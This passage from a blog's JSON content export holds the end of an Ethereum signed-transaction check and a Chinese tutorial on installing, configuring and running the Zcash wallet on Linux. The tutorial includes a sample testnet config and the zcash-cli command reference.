class=\"line\">&quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;</span><br></pre></td></tr></table></figure>\n<p>我们查看accounts[1]地址现在是否收到了1eth<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getBalance(eth.accounts[1])</span><br><span class=\"line\">1000000000000000000</span><br><span class=\"line\">&gt; web3.fromWei(eth.getBalance(eth.accounts[1]),&quot;ether&quot;)</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure></p>\n<p>查看交易结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getTransaction(&quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  blockHash: &quot;0x53bb7e8ef200dfa7dd2e72cba30bc9bcfb9e2de7bb49da1c35f49dbd18dd7c14&quot;,</span><br><span class=\"line\">  blockNumber: 4,</span><br><span class=\"line\">  from: &quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826&quot;,</span><br><span class=\"line\">  gas: 22856,</span><br><span class=\"line\">  gasPrice: 18000000000,</span><br><span class=\"line\">  hash: &quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;,</span><br><span class=\"line\">  input: &quot;0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;,</span><br><span class=\"line\">  nonce: 0,</span><br><span class=\"line\">  r: &quot;0x66674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7&quot;,</span><br><span class=\"line\">  s: &quot;0x4d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216&quot;,</span><br><span class=\"line\">  to: &quot;0x94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;,</span><br><span class=\"line\">  transactionIndex: 0,</span><br><span class=\"line\">  v: &quot;0x7f2&quot;,</span><br><span class=\"line\">  value: 1000000000000000000</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由此结果可以验证我们签名的交易正确。</p>\n"},{"title":"linux下Zcash钱包使用教程","comments":0,"date":"2018-02-08T11:04:15.000Z","img":null,"_content":"\n>Zcash (ZEC)是首个使用零知识证明机制的区块链系统，它可提供完全的支付保密性，同时仍能够使用公有区块链来维护一个去中心化网络。与比特币相同的是，Zcash代币（ZEC）的总量也是2100万，不同之处在于，Zcash交易自动隐藏区块链上所有交易的发送者、接受者及数额。只用那些拥有查看秘钥的人才能看到交易的内容。用户拥有完全的控制权，他们可自行选择向其他人提供查看秘钥.  ZCash 是 bitcoin 的分支，保留了 bitcoin 原有的模式，基于比特币 0.11.2 版代码修改的。 ZCash 钱包资金分 2 种：透明资金、私有资金，透明资金类似比特币资金；私有资金加强了 隐私性，涉及到私有资金的交易是保密不可查的，透明资金与透明资金的交易是公开可查的.\n\n>目前Zcash流通市值在12亿美元左右，每日交易额也高达1亿美元，其使用zero-knowledge proof（零知识证明）使得数字化货币更加具有安全性；隐私性而备受市场关注。\n\n现在zcash官方提供的钱包是linux版本的，而原因是zcash团队没人熟悉gui，不过zcash官方提供了编译后的可执行程序，这里也不用我们来进行编译了。\n\n下载地址 ： https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz\nhash     :  352ea2a67ae3484046a6bd43af9a5ce125e2d103a6a32ac71805658918f7076a\n\n下载后请务必进行哈希值验证，以保证文件的真实和准确性。\n\ntar -xvf zcash-1.0.14-linux64.tar.gz       //解压缩\nmv -t /usr/local/bin/ zcash-1.0.14/bin/*   //移动可执行文件\n\n\t\t\t\t\t\t\t\t\t\t   现在我们已经安装了zcash，运行下面的命令下载 key ，用于创建和验证参数。\n\n\t\t\t\t\t\t\t\t\t\t   zcash-fetch-params\n\n\t\t\t\t\t\t\t\t\t\t   这里由于国内网络的原因，可能会失败，请多试几次。\n\n\t\t\t\t\t\t\t\t\t\t   验证通过后，我们需要对客户端进行配置。\n\n\t\t\t\t\t\t\t\t\t\t   mkdir ~/.zcash //创建zcash目录\n\n\t\t\t\t\t\t\t\t\t\t   vim zcash.conf \n\n\t\t\t\t\t\t\t\t\t\t   以上按照个人配置的不同，设置不同的配置文件，下面提供一个配置供参考。\n\n\t\t\t\t\t\t\t\t\t\t   //这是测试链接的配置\n\t\t\t\t\t\t\t\t\t\t   addnode=testnet.z.cash    //节点\n\t\t\t\t\t\t\t\t\t\t   rpcuser=test              //rpc用户名\n\t\t\t\t\t\t\t\t\t\t   rpcpassword=test          //rpc密码\n\t\t\t\t\t\t\t\t\t\t   gen=0                     //屏蔽cpu挖矿\n\t\t\t\t\t\t\t\t\t\t   testnet=1                 //开启测试链\n\t\t\t\t\t\t\t\t\t\t   rpcallowip=100.100.60.10 //允许访问的IP\n\t\t\t\t\t\t\t\t\t\t   rpcport=8333             //rpc端口号\n\t\t\t\t\t\t\t\t\t\t   equihashsolver=tromp     //指定算法，非挖矿钱包可以删除\n\n\n\t\t\t\t\t\t\t\t\t\t   好了，保存后输入zcashd就可以启动zcash客户端了，也可以使用zcashd -daemon在后台运行zcash客户端,在shell输入zcash-cli getinfo命令就可以看到网络和块信息了。\n\n\t\t\t\t\t\t\t\t\t\t   下面提供一些zcash节点常用命令：\n\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getinfo                           //显示节点信息\n\t\t\t\t\t\t\t\t\t\t   zcashd -daemon                              //后台启动zcash守护\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getnetworkhashps                  //获取全网算力\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_getnewaddress                    //生成一个Z-addr\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getnewaddress                      //生成一个t-addr                   \n\t\t\t\t\t\t\t\t\t\t   zcas-cli getblockhash                       //区块高度\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getaddressesbyaccount \"\"         //显示所有t-addr钱包\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_listaddresses                   //显示所有Z-addr钱包\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_getbalance \"\"                   //z钱包余额\n\n\t\t\t\t\t\t\t\t\t\t   如果有其他的需要，可以使用zcash-cli help来查看zcash的全部命令。\n\n\n\t\t\t\t\t\t\t\t\t\t   附1：\n\n\t\t\t\t\t\t\t\t\t\t   zcash钱包配置：\n\n\t\t\t\t\t\t\t\t\t\t   //这里是zcash钱包主链配置\n\n\t\t\t\t\t\t\t\t\t\t   rpcuser=rpc用户名\n\t\t\t\t\t\t\t\t\t\t   rpcpassword=rpc密码\n\t\t\t\t\t\t\t\t\t\t   rpcport=rpc端口\n\t\t\t\t\t\t\t\t\t\t   rpcallowip=允许链接rpc ip地址\n\t\t\t\t\t\t\t\t\t\t   server=1        //打开服务\n\t\t\t\t\t\t\t\t\t\t   daemon=1        //后台运行守护\n\t\t\t\t\t\t\t\t\t\t   mainnet=1       //主链\n\t\t\t\t\t\t\t\t\t\t   addnode=mainnet.z.cash //主链节点\n\n\t\t\t\t\t\t\t\t\t\t   附2：\n\n\t\t\t\t\t\t\t\t\t\t   //zcash命令\n\n\t\t\t\t\t\t\t\t\t\t   == Blockchain ==\n\t\t\t\t\t\t\t\t\t\t   getbestblockhash\n\t\t\t\t\t\t\t\t\t\t   getblock \"hash|height\" ( verbose )\n\t\t\t\t\t\t\t\t\t\t   getblockchaininfo\n\t\t\t\t\t\t\t\t\t\t   getblockcount\n\t\t\t\t\t\t\t\t\t\t   getblockhash index\n\t\t\t\t\t\t\t\t\t\t   getblockheader \"hash\" ( verbose )\n\t\t\t\t\t\t\t\t\t\t   getchaintips\ngetdifficulty\ngetmempoolinfo\ngetrawmempool ( verbose )\n\t\tgettxout \"txid\" n ( includemempool )\n\t\tgettxoutproof [\"txid\",...] ( blockhash )\n\t\tgettxoutsetinfo\n\t\tverifychain ( checklevel numblocks )\n\t\tverifytxoutproof \"proof\"\n\n\t\t== Control ==\n\t\tgetinfo\n\t\thelp ( \"command\" )\n\t\tstop\n\n\t\t== Disclosure ==\n\t\tz_getpaymentdisclosure \"txid\" \"js_index\" \"output_index\" (\"message\") \n\t\tz_validatepaymentdisclosure \"paymentdisclosure\"\n\n\t\t== Generating ==\n\t\tgenerate numblocks\n\t\tgetgenerate\n\t\tsetgenerate generate ( genproclimit )\n\n\t\t== Mining ==\n\t\tgetblocksubsidy height\n\t\tgetblocktemplate ( \"jsonrequestobject\" )\n\t\tgetlocalsolps\n\t\tgetmininginfo\n\t\tgetnetworkhashps ( blocks height )\n\t\tgetnetworksolps ( blocks height )\n\t\tprioritisetransaction <txid> <priority delta> <fee delta>\n\t\tsubmitblock \"hexdata\" ( \"jsonparametersobject\" )\n\n\t\t== Network ==\n\t\taddnode \"node\" \"add|remove|onetry\"\n\t\tclearbanned\n\t\tdisconnectnode \"node\" \n\t\tgetaddednodeinfo dns ( \"node\" )\n\t\tgetconnectioncount\n\t\tgetnettotals\n\t\tgetnetworkinfo\n\t\tgetpeerinfo\n\t\tlistbanned\n\t\tping\n\t\tsetban \"ip(/netmask)\" \"add|remove\" (bantime) (absolute)\n\n\t\t== Rawtransactions ==\n\t\tcreaterawtransaction [{\"txid\":\"id\",\"vout\":n},...] {\"address\":amount,...}\n\t\tdecoderawtransaction \"hexstring\"\n\t\tdecodescript \"hex\"\n\t\tfundrawtransaction \"hexstring\"\n\t\tgetrawtransaction \"txid\" ( verbose )\n\t\tsendrawtransaction \"hexstring\" ( allowhighfees )\n\t\tsignrawtransaction \"hexstring\" ( [{\"txid\":\"id\",\"vout\":n,\"scriptPubKey\":\"hex\",\"redeemScript\":\"hex\"},...] [\"privatekey1\",...] sighashtype )\n\n\t\t== Util ==\n\t\tcreatemultisig nrequired [\"key\",...]\n\t\testimatefee nblocks\n\t\testimatepriority nblocks\n\t\tvalidateaddress \"zcashaddress\"\n\t\tverifymessage \"zcashaddress\" \"signature\" \"message\"\n\t\tz_validateaddress \"zaddr\"\n\n\t\t== Wallet ==\n\t\taddmultisigaddress nrequired [\"key\",...] ( \"account\" )\n\t\tbackupwallet \"destination\"\n\t\tdumpprivkey \"zcashaddress\"\n\t\tdumpwallet \"filename\"\n\t\tencryptwallet \"passphrase\"\n\t\tgetaccount \"zcashaddress\"\n\t\tgetaccountaddress \"account\"\n\t\tgetaddressesbyaccount \"account\"\n\t\tgetbalance ( \"account\" minconf includeWatchonly )\n\t\tgetnewaddress ( \"account\" )\n\t\tgetrawchangeaddress\n\t\tgetreceivedbyaccount \"account\" ( minconf )\n\t\tgetreceivedbyaddress \"zcashaddress\" ( minconf )\n\t\tgettransaction \"txid\" ( includeWatchonly )\n\t\tgetunconfirmedbalance\n\t\tgetwalletinfo\n\t\timportaddress \"address\" ( \"label\" rescan )\n\t\timportprivkey \"zcashprivkey\" ( \"label\" rescan )\n\t\timportwallet \"filename\"\n\t\tkeypoolrefill ( newsize )\n\t\tlistaccounts ( minconf includeWatchonly)\n\t\tlistaddressgroupings\n\t\tlistlockunspent\n\t\tlistreceivedbyaccount ( minconf includeempty includeWatchonly)\n\t\tlistreceivedbyaddress ( minconf includeempty includeWatchonly)\n\t\tlistsinceblock ( \"blockhash\" target-confirmations includeWatchonly)\n\t\tlisttransactions ( \"account\" count from includeWatchonly)\n\t\tlistunspent ( minconf maxconf  [\"address\",...] )\n\t\tlockunspent unlock [{\"txid\":\"txid\",\"vout\":n},...]\n\t\tmove \"fromaccount\" \"toaccount\" amount ( minconf \"comment\" )\n\t\tsendfrom \"fromaccount\" \"tozcashaddress\" amount ( minconf \"comment\" \"comment-to\" )\n\t\tsendmany \"fromaccount\" {\"address\":amount,...} ( minconf \"comment\" [\"address\",...] )\n\t\tsendtoaddress \"zcashaddress\" amount ( \"comment\" \"comment-to\" subtractfeefromamount )\n\t\tsetaccount \"zcashaddress\" \"account\"\n\t\tsettxfee amount\n\t\tsignmessage \"zcashaddress\" \"message\"\n\t\tz_exportkey \"zaddr\"\n\t\tz_exportviewingkey \"zaddr\"\n\t\tz_exportwallet \"filename\"\n\t\tz_getbalance \"address\" ( minconf )\n\t\tz_getnewaddress\n\t\tz_getoperationresult ([\"operationid\", ... ]) \n\t\tz_getoperationstatus ([\"operationid\", ... ]) \n\t\tz_gettotalbalance ( minconf includeWatchonly )\n\t\tz_importkey \"zkey\" ( rescan startHeight )\n\t\tz_importviewingkey \"vkey\" ( rescan startHeight )\n\t\tz_importwallet \"filename\"\n\t\tz_listaddresses ( includeWatchonly )\n\t\tz_listoperationids\n\t\tz_listreceivedbyaddress \"address\" ( minconf )\n\t\tz_sendmany \"fromaddress\" [{\"address\":... ,\"amount\":...},...] ( minconf ) ( fee )\n\t\tz_shieldcoinbase \"fromaddress\" \"tozaddress\" ( fee ) ( limit )\n\t\tzcbenchmark benchmarktype samplecount\n\t\tzcrawjoinsplit rawtx inputs outputs vpub_old vpub_new\n\t\tzcrawkeygen\n\t\tzcrawreceive zcsecretkey encryptednote\n\t\tzcsamplejoinsplit\n\n","source":"_posts/linux下Zcash钱包使用教程.md","raw":"---\ntitle: linux下Zcash钱包使用教程\ncomments: false\ndate: 2018-02-08 19:04:15\ncategories: 矿池\ntags: \n- lucas556 \n- zcash \n- 矿池\nimg:\n---\n\n>Zcash (ZEC)是首个使用零知识证明机制的区块链系统，它可提供完全的支付保密性，同时仍能够使用公有区块链来维护一个去中心化网络。与比特币相同的是，Zcash代币（ZEC）的总量也是2100万，不同之处在于，Zcash交易自动隐藏区块链上所有交易的发送者、接受者及数额。只用那些拥有查看秘钥的人才能看到交易的内容。用户拥有完全的控制权，他们可自行选择向其他人提供查看秘钥.  ZCash 是 bitcoin 的分支，保留了 bitcoin 原有的模式，基于比特币 0.11.2 版代码修改的。 ZCash 钱包资金分 2 种：透明资金、私有资金，透明资金类似比特币资金；私有资金加强了 隐私性，涉及到私有资金的交易是保密不可查的，透明资金与透明资金的交易是公开可查的.\n\n>目前Zcash流通市值在12亿美元左右，每日交易额也高达1亿美元，其使用zero-knowledge proof（零知识证明）使得数字化货币更加具有安全性；隐私性而备受市场关注。\n\n现在zcash官方提供的钱包是linux版本的，而原因是zcash团队没人熟悉gui，不过zcash官方提供了编译后的可执行程序，这里也不用我们来进行编译了。\n\n下载地址 ： https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz\nhash     :  352ea2a67ae3484046a6bd43af9a5ce125e2d103a6a32ac71805658918f7076a\n\n下载后请务必进行哈希值验证，以保证文件的真实和准确性。\n\ntar -xvf zcash-1.0.14-linux64.tar.gz       //解压缩\nmv -t /usr/local/bin/ zcash-1.0.14/bin/*   //移动可执行文件\n\n\t\t\t\t\t\t\t\t\t\t   现在我们已经安装了zcash，运行下面的命令下载 key ，用于创建和验证参数。\n\n\t\t\t\t\t\t\t\t\t\t   zcash-fetch-params\n\n\t\t\t\t\t\t\t\t\t\t   这里由于国内网络的原因，可能会失败，请多试几次。\n\n\t\t\t\t\t\t\t\t\t\t   验证通过后，我们需要对客户端进行配置。\n\n\t\t\t\t\t\t\t\t\t\t   mkdir ~/.zcash //创建zcash目录\n\n\t\t\t\t\t\t\t\t\t\t   vim zcash.conf \n\n\t\t\t\t\t\t\t\t\t\t   以上按照个人配置的不同，设置不同的配置文件，下面提供一个配置供参考。\n\n\t\t\t\t\t\t\t\t\t\t   //这是测试链接的配置\n\t\t\t\t\t\t\t\t\t\t   addnode=testnet.z.cash    //节点\n\t\t\t\t\t\t\t\t\t\t   rpcuser=test              //rpc用户名\n\t\t\t\t\t\t\t\t\t\t   rpcpassword=test          //rpc密码\n\t\t\t\t\t\t\t\t\t\t   gen=0                     //屏蔽cpu挖矿\n\t\t\t\t\t\t\t\t\t\t   testnet=1                 //开启测试链\n\t\t\t\t\t\t\t\t\t\t   rpcallowip=100.100.60.10 //允许访问的IP\n\t\t\t\t\t\t\t\t\t\t   rpcport=8333             //rpc端口号\n\t\t\t\t\t\t\t\t\t\t   equihashsolver=tromp     //指定算法，非挖矿钱包可以删除\n\n\n\t\t\t\t\t\t\t\t\t\t   好了，保存后输入zcashd就可以启动zcash客户端了，也可以使用zcashd -daemon在后台运行zcash客户端,在shell输入zcash-cli getinfo命令就可以看到网络和块信息了。\n\n\t\t\t\t\t\t\t\t\t\t   下面提供一些zcash节点常用命令：\n\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getinfo                           //显示节点信息\n\t\t\t\t\t\t\t\t\t\t   zcashd -daemon                              //后台启动zcash守护\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getnetworkhashps                  //获取全网算力\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_getnewaddress                    //生成一个Z-addr\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getnewaddress                      //生成一个t-addr                   \n\t\t\t\t\t\t\t\t\t\t   zcas-cli getblockhash                       //区块高度\n\t\t\t\t\t\t\t\t\t\t   zcash-cli getaddressesbyaccount \"\"         //显示所有t-addr钱包\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_listaddresses                   //显示所有Z-addr钱包\n\t\t\t\t\t\t\t\t\t\t   zcash-cli z_getbalance \"\"                   //z钱包余额\n\n\t\t\t\t\t\t\t\t\t\t   如果有其他的需要，可以使用zcash-cli help来查看zcash的全部命令。\n\n\n\t\t\t\t\t\t\t\t\t\t   附1：\n\n\t\t\t\t\t\t\t\t\t\t   zcash钱包配置：\n\n\t\t\t\t\t\t\t\t\t\t   //这里是zcash钱包主链配置\n\n\t\t\t\t\t\t\t\t\t\t   rpcuser=rpc用户名\n\t\t\t\t\t\t\t\t\t\t   rpcpassword=rpc密码\n\t\t\t\t\t\t\t\t\t\t   rpcport=rpc端口\n\t\t\t\t\t\t\t\t\t\t   rpcallowip=允许链接rpc ip地址\n\t\t\t\t\t\t\t\t\t\t   server=1        //打开服务\n\t\t\t\t\t\t\t\t\t\t   daemon=1        //后台运行守护\n\t\t\t\t\t\t\t\t\t\t   mainnet=1       //主链\n\t\t\t\t\t\t\t\t\t\t   addnode=mainnet.z.cash //主链节点\n\n\t\t\t\t\t\t\t\t\t\t   附2：\n\n\t\t\t\t\t\t\t\t\t\t   //zcash命令\n\n\t\t\t\t\t\t\t\t\t\t   == Blockchain ==\n\t\t\t\t\t\t\t\t\t\t   getbestblockhash\n\t\t\t\t\t\t\t\t\t\t   getblock \"hash|height\" ( verbose )\n\t\t\t\t\t\t\t\t\t\t   getblockchaininfo\n\t\t\t\t\t\t\t\t\t\t   getblockcount\n\t\t\t\t\t\t\t\t\t\t   getblockhash index\n\t\t\t\t\t\t\t\t\t\t   getblockheader \"hash\" ( verbose )\n\t\t\t\t\t\t\t\t\t\t   getchaintips\ngetdifficulty\ngetmempoolinfo\ngetrawmempool ( verbose )\n\t\tgettxout \"txid\" n ( includemempool )\n\t\tgettxoutproof [\"txid\",...] ( blockhash )\n\t\tgettxoutsetinfo\n\t\tverifychain ( checklevel numblocks )\n\t\tverifytxoutproof \"proof\"\n\n\t\t== Control ==\n\t\tgetinfo\n\t\thelp ( \"command\" )\n\t\tstop\n\n\t\t== Disclosure ==\n\t\tz_getpaymentdisclosure \"txid\" \"js_index\" \"output_index\" (\"message\") \n\t\tz_validatepaymentdisclosure \"paymentdisclosure\"\n\n\t\t== Generating ==\n\t\tgenerate numblocks\n\t\tgetgenerate\n\t\tsetgenerate generate ( genproclimit )\n\n\t\t== Mining ==\n\t\tgetblocksubsidy height\n\t\tgetblocktemplate ( \"jsonrequestobject\" )\n\t\tgetlocalsolps\n\t\tgetmininginfo\n\t\tgetnetworkhashps ( blocks height )\n\t\tgetnetworksolps ( blocks height )\n\t\tprioritisetransaction <txid> <priority delta> <fee delta>\n\t\tsubmitblock \"hexdata\" ( \"jsonparametersobject\" )\n\n\t\t== Network ==\n\t\taddnode \"node\" \"add|remove|onetry\"\n\t\tclearbanned\n\t\tdisconnectnode \"node\" \n\t\tgetaddednodeinfo dns ( \"node\" )\n\t\tgetconnectioncount\n\t\tgetnettotals\n\t\tgetnetworkinfo\n\t\tgetpeerinfo\n\t\tlistbanned\n\t\tping\n\t\tsetban \"ip(/netmask)\" \"add|remove\" (bantime) (absolute)\n\n\t\t== Rawtransactions ==\n\t\tcreaterawtransaction [{\"txid\":\"id\",\"vout\":n},...] {\"address\":amount,...}\n\t\tdecoderawtransaction \"hexstring\"\n\t\tdecodescript \"hex\"\n\t\tfundrawtransaction \"hexstring\"\n\t\tgetrawtransaction \"txid\" ( verbose )\n\t\tsendrawtransaction \"hexstring\" ( allowhighfees )\n\t\tsignrawtransaction \"hexstring\" ( [{\"txid\":\"id\",\"vout\":n,\"scriptPubKey\":\"hex\",\"redeemScript\":\"hex\"},...] [\"privatekey1\",...] sighashtype )\n\n\t\t== Util ==\n\t\tcreatemultisig nrequired [\"key\",...]\n\t\testimatefee nblocks\n\t\testimatepriority nblocks\n\t\tvalidateaddress \"zcashaddress\"\n\t\tverifymessage \"zcashaddress\" \"signature\" \"message\"\n\t\tz_validateaddress \"zaddr\"\n\n\t\t== Wallet ==\n\t\taddmultisigaddress nrequired [\"key\",...] ( \"account\" )\n\t\tbackupwallet \"destination\"\n\t\tdumpprivkey \"zcashaddress\"\n\t\tdumpwallet \"filename\"\n\t\tencryptwallet \"passphrase\"\n\t\tgetaccount \"zcashaddress\"\n\t\tgetaccountaddress \"account\"\n\t\tgetaddressesbyaccount \"account\"\n\t\tgetbalance ( \"account\" minconf includeWatchonly )\n\t\tgetnewaddress ( \"account\" )\n\t\tgetrawchangeaddress\n\t\tgetreceivedbyaccount \"account\" ( minconf )\n\t\tgetreceivedbyaddress \"zcashaddress\" ( minconf )\n\t\tgettransaction \"txid\" ( includeWatchonly )\n\t\tgetunconfirmedbalance\n\t\tgetwalletinfo\n\t\timportaddress \"address\" ( \"label\" rescan )\n\t\timportprivkey \"zcashprivkey\" ( \"label\" rescan )\n\t\timportwallet \"filename\"\n\t\tkeypoolrefill ( newsize )\n\t\tlistaccounts ( minconf includeWatchonly)\n\t\tlistaddressgroupings\n\t\tlistlockunspent\n\t\tlistreceivedbyaccount ( minconf includeempty includeWatchonly)\n\t\tlistreceivedbyaddress ( minconf includeempty includeWatchonly)\n\t\tlistsinceblock ( \"blockhash\" target-confirmations includeWatchonly)\n\t\tlisttransactions ( \"account\" count from includeWatchonly)\n\t\tlistunspent ( minconf maxconf  [\"address\",...] )\n\t\tlockunspent unlock [{\"txid\":\"txid\",\"vout\":n},...]\n\t\tmove \"fromaccount\" \"toaccount\" amount ( minconf \"comment\" )\n\t\tsendfrom \"fromaccount\" \"tozcashaddress\" amount ( minconf \"comment\" \"comment-to\" )\n\t\tsendmany \"fromaccount\" {\"address\":amount,...} ( minconf \"comment\" [\"address\",...] )\n\t\tsendtoaddress \"zcashaddress\" amount ( \"comment\" \"comment-to\" subtractfeefromamount )\n\t\tsetaccount \"zcashaddress\" \"account\"\n\t\tsettxfee amount\n\t\tsignmessage \"zcashaddress\" \"message\"\n\t\tz_exportkey \"zaddr\"\n\t\tz_exportviewingkey \"zaddr\"\n\t\tz_exportwallet \"filename\"\n\t\tz_getbalance \"address\" ( minconf )\n\t\tz_getnewaddress\n\t\tz_getoperationresult ([\"operationid\", ... ]) \n\t\tz_getoperationstatus ([\"operationid\", ... ]) \n\t\tz_gettotalbalance ( minconf includeWatchonly )\n\t\tz_importkey \"zkey\" ( rescan startHeight )\n\t\tz_importviewingkey \"vkey\" ( rescan startHeight )\n\t\tz_importwallet \"filename\"\n\t\tz_listaddresses ( includeWatchonly )\n\t\tz_listoperationids\n\t\tz_listreceivedbyaddress \"address\" ( minconf )\n\t\tz_sendmany \"fromaddress\" [{\"address\":... ,\"amount\":...},...] ( minconf ) ( fee )\n\t\tz_shieldcoinbase \"fromaddress\" \"tozaddress\" ( fee ) ( limit )\n\t\tzcbenchmark benchmarktype samplecount\n\t\tzcrawjoinsplit rawtx inputs outputs vpub_old vpub_new\n\t\tzcrawkeygen\n\t\tzcrawreceive zcsecretkey encryptednote\n\t\tzcsamplejoinsplit\n\n","slug":"linux下Zcash钱包使用教程","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piav20009pkwo5ropiacu","content":"<blockquote>\n<p>Zcash (ZEC)是首个使用零知识证明机制的区块链系统，它可提供完全的支付保密性，同时仍能够使用公有区块链来维护一个去中心化网络。与比特币相同的是，Zcash代币（ZEC）的总量也是2100万，不同之处在于，Zcash交易自动隐藏区块链上所有交易的发送者、接受者及数额。只用那些拥有查看秘钥的人才能看到交易的内容。用户拥有完全的控制权，他们可自行选择向其他人提供查看秘钥.  ZCash 是 bitcoin 的分支，保留了 bitcoin 原有的模式，基于比特币 0.11.2 版代码修改的。 ZCash 钱包资金分 2 种：透明资金、私有资金，透明资金类似比特币资金；私有资金加强了 隐私性，涉及到私有资金的交易是保密不可查的，透明资金与透明资金的交易是公开可查的.</p>\n<p>目前Zcash流通市值在12亿美元左右，每日交易额也高达1亿美元，其使用zero-knowledge proof（零知识证明）使得数字化货币更加具有安全性；隐私性而备受市场关注。</p>\n</blockquote>\n<p>现在zcash官方提供的钱包是linux版本的，而原因是zcash团队没人熟悉gui，不过zcash官方提供了编译后的可执行程序，这里也不用我们来进行编译了。</p>\n<p>下载地址 ： <a href=\"https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz\" target=\"_blank\" rel=\"noopener\">https://z.cash/downloads/zcash-1.0.14-linux64.tar.gz</a><br>hash     :  352ea2a67ae3484046a6bd43af9a5ce125e2d103a6a32ac71805658918f7076a</p>\n<p>下载后请务必进行哈希值验证，以保证文件的真实和准确性。</p>\n<p>tar -xvf zcash-1.0.14-linux64.tar.gz       //解压缩<br>mv -t /usr/local/bin/ zcash-1.0.14/bin/*   //移动可执行文件</p>\n<pre><code>现在我们已经安装了zcash，运行下面的命令下载 key ，用于创建和验证参数。\n\nzcash-fetch-params\n\n这里由于国内网络的原因，可能会失败，请多试几次。\n\n验证通过后，我们需要对客户端进行配置。\n\nmkdir ~/.zcash //创建zcash目录\n\nvim zcash.conf \n\n以上按照个人配置的不同，设置不同的配置文件，下面提供一个配置供参考。\n\n//这是测试链接的配置\naddnode=testnet.z.cash    //节点\nrpcuser=test              //rpc用户名\nrpcpassword=test          //rpc密码\ngen=0                     //屏蔽cpu挖矿\ntestnet=1                 //开启测试链\nrpcallowip=100.100.60.10 //允许访问的IP\nrpcport=8333             //rpc端口号\nequihashsolver=tromp     //指定算法，非挖矿钱包可以删除\n\n\n好了，保存后输入zcashd就可以启动zcash客户端了，也可以使用zcashd -daemon在后台运行zcash客户端,在shell输入zcash-cli getinfo命令就可以看到网络和块信息了。\n\n下面提供一些zcash节点常用命令：\n\nzcash-cli getinfo                           //显示节点信息\nzcashd -daemon                              //后台启动zcash守护\nzcash-cli getnetworkhashps                  //获取全网算力\nzcash-cli z_getnewaddress                    //生成一个Z-addr\nzcash-cli getnewaddress                      //生成一个t-addr                   \nzcas-cli getblockhash                       //区块高度\nzcash-cli getaddressesbyaccount &quot;&quot;         //显示所有t-addr钱包\nzcash-cli z_listaddresses                   //显示所有Z-addr钱包\nzcash-cli z_getbalance &quot;&quot;                   //z钱包余额\n\n如果有其他的需要，可以使用zcash-cli help来查看zcash的全部命令。\n\n\n附1：\n\nzcash钱包配置：\n\n//这里是zcash钱包主链配置\n\nrpcuser=rpc用户名\nrpcpassword=rpc密码\nrpcport=rpc端口\nrpcallowip=允许链接rpc ip地址\nserver=1        //打开服务\ndaemon=1        //后台运行守护\nmainnet=1       //主链\naddnode=mainnet.z.cash //主链节点\n\n附2：\n\n//zcash命令\n\n== Blockchain ==\ngetbestblockhash\ngetblock &quot;hash|height&quot; ( verbose )\ngetblockchaininfo\ngetblockcount\ngetblockhash index\ngetblockheader &quot;hash&quot; ( verbose )\ngetchaintips\n</code></pre><p>getdifficulty<br>getmempoolinfo<br>getrawmempool ( verbose )<br>        gettxout “txid” n ( includemempool )<br>        gettxoutproof [“txid”,…] ( blockhash )<br>        gettxoutsetinfo<br>        verifychain ( checklevel numblocks )<br>        verifytxoutproof “proof”</p>\n<pre><code>== Control ==\ngetinfo\nhelp ( &quot;command&quot; )\nstop\n\n== Disclosure ==\nz_getpaymentdisclosure &quot;txid&quot; &quot;js_index&quot; &quot;output_index&quot; (&quot;message&quot;) \nz_validatepaymentdisclosure &quot;paymentdisclosure&quot;\n\n== Generating ==\ngenerate numblocks\ngetgenerate\nsetgenerate generate ( genproclimit )\n\n== Mining ==\ngetblocksubsidy height\ngetblocktemplate ( &quot;jsonrequestobject&quot; )\ngetlocalsolps\ngetmininginfo\ngetnetworkhashps ( blocks height )\ngetnetworksolps ( blocks height )\nprioritisetransaction &lt;txid&gt; &lt;priority delta&gt; &lt;fee delta&gt;\nsubmitblock &quot;hexdata&quot; ( &quot;jsonparametersobject&quot; )\n\n== Network ==\naddnode &quot;node&quot; &quot;add|remove|onetry&quot;\nclearbanned\ndisconnectnode &quot;node&quot; \ngetaddednodeinfo dns ( 